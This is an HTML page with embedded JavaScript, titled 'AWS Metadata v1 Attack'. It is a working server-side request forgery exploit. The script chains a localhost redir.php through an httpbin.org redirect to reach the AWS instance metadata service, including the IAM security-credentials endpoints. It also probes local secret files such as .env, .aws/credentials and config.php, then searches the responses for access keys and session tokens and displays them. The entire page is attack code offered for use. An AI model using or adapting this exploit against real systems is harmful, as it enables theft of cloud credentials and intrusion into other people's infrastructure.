<!DOCTYPE html>
<html>
<head>
    <title>AWS Metadata v1 Attack</title>
</head>
<body>
    <h1>üéØ AWS Metadata Service v1 + Localhost Exploration</h1>
    <div id="results"></div>
    
    <script>
        var results = "";
        
        // Since we confirmed httpbin.org redirect works, try AWS metadata v1 endpoints
        var awsV1Tests = [
            // AWS Metadata Service v1.0 (no token required!)
            'http://httpbin.org/redirect-to?url=http://169.254.169.254/1.0/meta-data/',
            'http://httpbin.org/redirect-to?url=http://169.254.169.254/1.0/meta-data/iam/',
            'http://httpbin.org/redirect-to?url=http://169.254.169.254/1.0/meta-data/iam/security-credentials/',
            
            // Try older AWS API versions
            'http://httpbin.org/redirect-to?url=http://169.254.169.254/2007-01-19/meta-data/',
            'http://httpbin.org/redirect-to?url=http://169.254.169.254/2008-02-01/meta-data/',
            'http://httpbin.org/redirect-to?url=http://169.254.169.254/2009-04-04/meta-data/',
            'http://httpbin.org/redirect-to?url=http://169.254.169.254/2011-01-01/meta-data/',
            
            // Try without /latest/ prefix
            'http://httpbin.org/redirect-to?url=http://169.254.169.254/meta-data/',
            'http://httpbin.org/redirect-to?url=http://169.254.169.254/user-data/',
            
            // Explore localhost since it returned 3201 bytes!
            'http://httpbin.org/redirect-to?url=http://127.0.0.1/',
            'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=https://www.google.com',
            'http://httpbin.org/redirect-to?url=http://127.0.0.1/.env',
            'http://httpbin.org/redirect-to?url=http://127.0.0.1/.aws/credentials',
            'http://httpbin.org/redirect-to?url=http://127.0.0.1/config.php',
            'http://httpbin.org/redirect-to?url=http://127.0.0.1/phpinfo.php',
            'http://httpbin.org/redirect-to?url=http://127.0.0.1/debug.php',
            'http://httpbin.org/redirect-to?url=http://127.0.0.1/credentials',
            'http://httpbin.org/redirect-to?url=http://127.0.0.1/aws-credentials',
            'http://httpbin.org/redirect-to?url=http://127.0.0.1/secret/',
            'http://httpbin.org/redirect-to?url=http://127.0.0.1/admin/',
            'http://httpbin.org/redirect-to?url=http://127.0.0.1/backup/',
            
            // Try to access AWS metadata via 127.0.0.1 (might have different routing)
            'http://httpbin.org/redirect-to?url=http://127.0.0.1:169/meta-data/',
            'http://httpbin.org/redirect-to?url=http://127.0.0.1/meta-data/',
        ];
        
        for(var i = 0; i < awsV1Tests.length; i++) {
            try {
                results += "<h3>üéØ " + (i+1) + ": " + awsV1Tests[i].split('url=')[1] + "</h3>";
                var xhr = new XMLHttpRequest();
                xhr.open('GET', 'http://localhost/redir.php?url=' + encodeURIComponent(awsV1Tests[i]), false);
                xhr.send();
                
                if(xhr.responseText && xhr.responseText.trim().length > 5) {
                    results += "<div style='background:#e8f5e8;padding:10px;border:2px solid green;'>üéØ SUCCESS: " + xhr.responseText.length + " bytes</div>";
                    
                    // Look for AWS credentials
                    var text = xhr.responseText.toLowerCase();
                    if(text.includes('accesskeyid') || text.includes('secretaccesskey') || text.includes('sessiontoken')) {
                        results += "<div style='background:#ff0000;color:white;padding:10px;border:3px solid red;'>üö® AWS CREDENTIALS FOUND! üö®</div>";
                    }
                    if(text.includes('s3role') || text.includes('ec2role') || text.includes('iam')) {
                        results += "<div style='background:#ffa500;color:white;padding:8px;'>üîë IAM ROLE DETECTED!</div>";
                    }
                    if(text.includes('ami-') || text.includes('instance-') || text.includes('vol-')) {
                        results += "<div style='background:#74c0fc;padding:8px;'>‚òÅÔ∏è AWS METADATA FOUND!</div>";
                    }
                    if(text.includes('401') || text.includes('unauthorized')) {
                        results += "<div style='background:#ffeaa7;padding:8px;'>‚ö†Ô∏è 401 Unauthorized (need token)</div>";
                    }
                    
                    results += "<div style='background:#f0f0f0;padding:10px;max-height:200px;overflow:scroll;font-size:10px;white-space:pre-wrap;word-wrap:break-word;'>" + xhr.responseText + "</div>";
                } else {
                    results += "<div style='background:#ffe8e8;padding:3px;'>‚ùå No response</div>";
                }
            } catch(e) {
                results += "<div style='background:#ffe8e8;padding:3px;'>‚ùå " + e.message.substring(0, 50) + "</div>";
            }
        }
        
        document.getElementById("results").innerHTML = results;
    </script>
</body>
</html>
